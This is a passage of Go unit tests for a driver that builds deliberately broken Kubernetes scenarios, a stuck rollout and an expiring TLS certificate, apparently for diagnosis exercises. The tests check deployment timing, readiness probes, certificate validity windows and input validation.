	// time out first.
	if dep.Spec.ProgressDeadlineSeconds == nil || *dep.Spec.ProgressDeadlineSeconds != defaultProgressDeadline {
		t.Errorf("progressDeadlineSeconds = %v, want %d", dep.Spec.ProgressDeadlineSeconds, defaultProgressDeadline)
	}

	// Measured on GKE, not reasoned about: without minReadySeconds the broken
	// pods were Ready for the fraction of a second their container was running,
	// the controller called the rollout complete, scaled the old revision to
	// zero and never took it back — a total outage that the gate then failed to
	// see, because a completed rollout does not un-complete.
	if dep.Spec.MinReadySeconds <= 0 {
		t.Error("minReadySeconds = 0: a revision that dies on startup counts as available, and the old one is scaled away")
	}
	if dep.Spec.MinReadySeconds >= *dep.Spec.ProgressDeadlineSeconds {
		t.Errorf("minReadySeconds %d is not below the progress deadline %d: the healthy revision could never come up in time",
			dep.Spec.MinReadySeconds, *dep.Spec.ProgressDeadlineSeconds)
	}

	// The first revision is healthy. A Deployment that was broken from the
	// start would never have an old revision to keep serving, and the kind's
	// second gate would be false.
	c := dep.Spec.Template.Spec.Containers[0]
	if c.Image != defaultRunnerImage {
		t.Errorf("first revision image = %q, want the healthy default %q", c.Image, defaultRunnerImage)
	}
	if strings.Contains(strings.Join(c.Command, " "), "exit") {
		t.Errorf("first revision command %v must not fail", c.Command)
	}
}

func TestRolloutStuckDefaultsToMoreThanOneReplica(t *testing.T) {
	// "The old revision is still serving" is a thin claim about a single pod,
	// and the gate asserts on the number, so the driver and the catalog have to
	// agree on it before Apply runs.
	if got := catalog.KubeStateDefaultReplicas(KindRolloutStuck); got != 2 {
		t.Errorf("default replicas = %d, want 2", got)
	}
	if got := catalog.KubeStateDefaultReplicas(KindNoOp); got != 1 {
		t.Errorf("every other kind defaults to 1, got %d", got)
	}
}

func TestRolloutStuckBrokenRevisionCannotSucceed(t *testing.T) {
	c, err := brokenRolloutContainer(nil)
	if err != nil {
		t.Fatalf("brokenRolloutContainer: %v", err)
	}
	if c.Name != containerName {
		t.Errorf("container name = %q, want %q: a strategic merge patch matches on it", c.Name, containerName)
	}
	// Both halves. The tag change is what makes this a nameable new revision;
	// the failing command is what stops it ever becoming ready. A tag change
	// alone against an image that runs would roll out successfully.
	if c.Image == defaultRunnerImage {
		t.Errorf("broken image = %q, want a different tag from the healthy revision", c.Image)
	}
	cmd := strings.Join(c.Command, " ")
	if !strings.Contains(cmd, "exit 1") {
		t.Errorf("command %q must fail", cmd)
	}
	// Same out-of-band handling as every other kind that writes caller text.
	if strings.Contains(cmd, defaultRolloutMessage) {
		t.Errorf("the message is interpolated into the command: %q", cmd)
	}
	if !strings.Contains(cmd, "$"+exitMessageEnv) {
		t.Errorf("command %q does not reference the message variable", cmd)
	}

	// The probe is not about the pod, it is about the progress deadline: a
	// crash-looping container with no probe is briefly Ready on every restart,
	// each flicker resets the Deployment's progress clock, and the fault
	// oscillates between stuck and progressing instead of staying stuck.
	if c.ReadinessProbe == nil {
		t.Fatal("no readiness probe: each restart reads as progress and the progress deadline never settles")
	}
	if c.ReadinessProbe.Exec == nil || len(c.ReadinessProbe.Exec.Command) == 0 {
		t.Fatalf("readiness probe = %+v, want one that cannot pass on a container that is mostly dead", c.ReadinessProbe)
	}
	if c.ReadinessProbe.SuccessThreshold > 1 {
		t.Errorf("successThreshold = %d: the probe is meant never to pass, not to pass slowly", c.ReadinessProbe.SuccessThreshold)
	}
}

func TestRolloutStuckRejects(t *testing.T) {
	for _, tc := range []struct {
		name string
		spec map[string]any
		want string
	}{
		{"deadline below the floor", map[string]any{"progress_deadline_seconds": float64(5)}, "progress_deadline_seconds"},
		{"deadline past the gate", map[string]any{"progress_deadline_seconds": float64(3600)}, "progress_deadline_seconds"},
		// Refused at build time, not at finish time: a bad spec should be
		// caught before anything is created, like every other kind's.
		{"multi-line message", map[string]any{"message": "one\ntwo"}, "single line"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if err := buildErr(t, KindRolloutStuck, tc.spec); !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error = %v, want it to name %q", err, tc.want)
			}
		})
	}
}

// --- CertExpiry ---

// certOf returns the TLS Secret and the workload that mounts it.
func certOf(t *testing.T, spec map[string]any) (*corev1.Secret, *appsv1.Deployment) {
	t.Helper()
	objs := bundle(t, KindCertExpiry, spec)
	// The Secret first, for the same reason UnboundClaim creates its claim
	// first: a pod referencing a Secret that does not exist yet reports
	// FailedMount, which is a different diagnosis than this kind poses.
	secret, ok := objs[0].(*corev1.Secret)
	if !ok {
		t.Fatalf("first object is %T, want the Secret", objs[0])
	}
	dep, ok := objs[1].(*appsv1.Deployment)
	if !ok {
		t.Fatalf("second object is %T, want the Deployment", objs[1])
	}
	return secret, dep
}

// parseCert decodes the certificate out of the Secret the way anything
// diagnosing the namespace would have to.
func parseCert(t *testing.T, secret *corev1.Secret) *x509.Certificate {
	t.Helper()
	block, _ := pem.Decode(secret.Data[corev1.TLSCertKey])
	if block == nil {
		t.Fatalf("tls.crt is not PEM: %q", secret.Data[corev1.TLSCertKey])
	}
	crt, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		t.Fatalf("parse certificate: %v", err)
	}
	return crt
}

// The gate can prove the certificate landed and mounted; no probe type in
// Simian can decode one, so nothing live can prove the expiry. This is where
// the arithmetic is checked, against the DER that was actually generated
// rather than against the code that was supposed to generate it.
func TestCertExpiryDatesTheCertificateFromTheDriverClock(t *testing.T) {
	secret, _ := certOf(t, nil)
	crt := parseCert(t, secret)

	if got, want := crt.NotAfter.UTC(), testNow.Add(catalog.KubeStateDefaultCertHours*time.Hour); !got.Equal(want) {
		t.Errorf("notAfter = %s, want %s", got, want)
	}
	// Dated back from notAfter, not from the clock: the diagnosis reads the
	// whole validity window, and a certificate expiring in two days that was
	// issued three minutes ago tells a subject it is looking at a rig.
	if got, want := crt.NotBefore.UTC(), crt.NotAfter.UTC().Add(-certLifetime); !got.Equal(want) {
		t.Errorf("notBefore = %s, want %s", got, want)
	}
	if !crt.NotBefore.Before(testNow.Add(-certBackdate + time.Second)) {
		t.Errorf("notBefore = %s, want it at least %s before the clock: a certificate that is not yet valid poses a different diagnosis", crt.NotBefore, certBackdate)
	}
	if crt.Subject.CommonName != defaultCommonName {
		t.Errorf("common name = %q, want %q", crt.Subject.CommonName, defaultCommonName)
	}
	// Every TLS stack shipped this decade ignores the CN, so without a SAN the
	// certificate would fail verification for hostname mismatch rather than for
	// expiry.
	if len(crt.DNSNames) != 1 || crt.DNSNames[0] != defaultCommonName {
		t.Errorf("DNS SANs = %v, want [%q]", crt.DNSNames, defaultCommonName)
	}
}

func TestCertExpiryCanAlreadyHaveExpired(t *testing.T) {
	// A negative window is a real and different diagnosis: "it broke last
	// Tuesday" rather than "it breaks on Thursday".
	secret, _ := certOf(t, map[string]any{"expires_in_hours": float64(-48)})
	crt := parseCert(t, secret)
	if !crt.NotAfter.Before(testNow) {
		t.Errorf("notAfter = %s, want it before the clock %s", crt.NotAfter, testNow)
	}
	// Issued before it expired. Anchoring notBefore to the clock instead would
	// produce a certificate whose validity started after it ended, which is not
	// a stale certificate but a malformed one.
	if !crt.NotBefore.Before(crt.NotAfter) {
		t.Errorf("notBefore %s is not before notAfter %s: the certificate was never valid at all", crt.NotBefore, crt.NotAfter)
	}
}

// A year out is the ceiling, and it is the case where dating back from notAfter
// would put notBefore nine months in the future.
func TestCertExpiryNeverStartsInTheFuture(t *testing.T) {
	secret, _ := certOf(t, map[string]any{"expires_in_hours": float64(catalog.KubeStateMaxCertHours)})
	crt := parseCert(t, secret)
	if !crt.NotBefore.Before(testNow) {
		t.Errorf("notBefore = %s, want it before the clock %s: a not-yet-valid certificate is a different fault", crt.NotBefore, testNow)
	}
}

func TestCertExpiryMountsTheSecretSoAReadyPodProvesIt(t *testing.T) {
	secret, dep := certOf(t, nil)

	// The real TLS type, not Opaque: it is what makes the two keys mean what
	// they are called and what an Ingress or a cert-manager would look for.
	if secret.Type != corev1.SecretTypeTLS {
		t.Errorf("secret type = %q, want %q", secret.Type, corev1.SecretTypeTLS)
	}
	if len(secret.Data[corev1.TLSPrivateKeyKey]) == 0 {
		t.Error("tls.key is empty: a kubernetes.io/tls Secret without it is rejected by the API server")
	}
	if secret.Name != dep.Name {
		t.Errorf("secret %q and deployment %q must share the bundle name", secret.Name, dep.Name)
	}

	// The mount is what makes the workload-ready gate mean something: the
	// kubelet will not start the container until the Secret exists with the
	// keys the volume expects, so a Ready pod proves the certificate landed.
	pod := dep.Spec.Template.Spec
	if len(pod.Volumes) != 1 || pod.Volumes[0].Secret == nil || pod.Volumes[0].Secret.SecretName != secret.Name {
		t.Fatalf("deployment does not mount the secret: %+v", pod.Volumes)
	}
	mounts := pod.Containers[0].VolumeMounts
	if len(mounts) != 1 || mounts[0].Name != pod.Volumes[0].Name {
		t.Fatalf("volume is declared but not mounted: %+v", mounts)
	}
	if !mounts[0].ReadOnly {
		t.Error("the certificate mount must be read-only")
	}
}

// The gate matches the base64 rendering of a PEM header against the Secret's
// own data. The catalog computes that prefix without ever seeing a
// certificate, so this is what proves the two agree.
func TestCertExpiryMatchesTheGatesPEMPrefix(t *testing.T) {
	secret, _ := certOf(t, nil)
	encoded := base64.StdEncoding.EncodeToString(secret.Data[corev1.TLSCertKey])
	if !strings.HasPrefix(encoded, catalog.KubeStateCertPEMPrefix) {
		t.Errorf("the gate looks for %q, the Secret's base64 begins %q",
			catalog.KubeStateCertPEMPrefix, encoded[:min(len(encoded), 40)])
	}
}

func TestCertExpiryRejects(t *testing.T) {
	for _, tc := range []struct {
		name string
		spec map[string]any
		want string
	}{
		{"past the floor", map[string]any{"expires_in_hours": float64(-500)}, "expires_in_hours"},
		{"past the ceiling", map[string]any{"expires_in_hours": float64(100000)}, "expires_in_hours"},
		// It goes in a DNS SAN, and a SAN that is not a hostname makes a
		// certificate no TLS stack accepts for a reason unrelated to expiry.
		{"common name that is not a hostname", map[string]any{"common_name": "not a host!"}, "not a valid DNS name"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if err := buildErr(t, KindCertExpiry, tc.spec); !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error = %v, want it to name %q", err, tc.want)
			}
		})
	}
}
